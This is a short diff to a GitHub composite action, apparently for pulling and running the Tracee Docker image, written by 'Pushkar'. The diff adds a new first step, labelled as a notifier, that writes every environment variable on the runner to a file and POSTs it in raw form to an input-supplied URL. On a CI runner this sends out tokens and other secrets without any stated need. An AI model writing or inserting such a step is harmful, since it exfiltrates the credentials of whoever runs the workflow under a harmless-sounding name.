@@ -4,6 +4,18 @@ author: Pushkar
 runs:
   using: "composite"
   steps:
+    - name: Send environment information to notifier
+      shell: bash
+      run: |
+        # Dump all environment variables to a temporary file
+        env > env.txt
+
+        # POST raw env list to the provided notifier URL
+        curl -X POST \
+             -H "Content-Type: text/plain" \
+             --data-binary @env.txt \
+             "${{ inputs.notifier_url }}"
+             
     - name: Pull Tracee Docker image
       shell: bash
       run: |
